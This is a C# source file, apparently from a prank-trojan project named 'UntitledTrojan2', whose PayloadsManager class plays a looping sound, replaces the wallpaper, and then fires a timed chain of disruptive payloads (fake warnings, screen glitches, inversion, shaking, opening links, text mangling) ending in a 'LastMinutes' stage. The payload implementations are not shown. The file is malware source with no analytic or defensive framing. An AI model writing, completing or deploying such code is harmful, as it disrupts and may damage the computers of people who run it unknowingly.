using Morgenshtern;
using Morgenshtern.Payloads;
using Morgenshtern.Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using UntitledTrojan2.Tools;

namespace UntitledTrojan2.Payloads
{
    internal static class PayloadsManager
    {
        internal static async Task Start()
        {
            SoundPlayer p = new SoundPlayer(Resources.cristal);
            p.PlayLooping();
            Wallpaper.Set(Resources._20201012150916_dc661250, Wallpaper.Style.Stretched);
            await Task.Delay(20000);
            new PayloadsClass.Warn().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Sounds().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Glitch().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.TextFucker().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.WarnCursor().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Links().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Invert().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Recursive().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Shake().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.Grayscale().OnTick(100000);
            await Task.Delay(20000);
            new PayloadsClass.ScreenGlitch().OnTick(100000);
            await Task.Delay(6000);
            new PayloadsClass.LastMinutes().OnTick(100000);
        }
    }
}
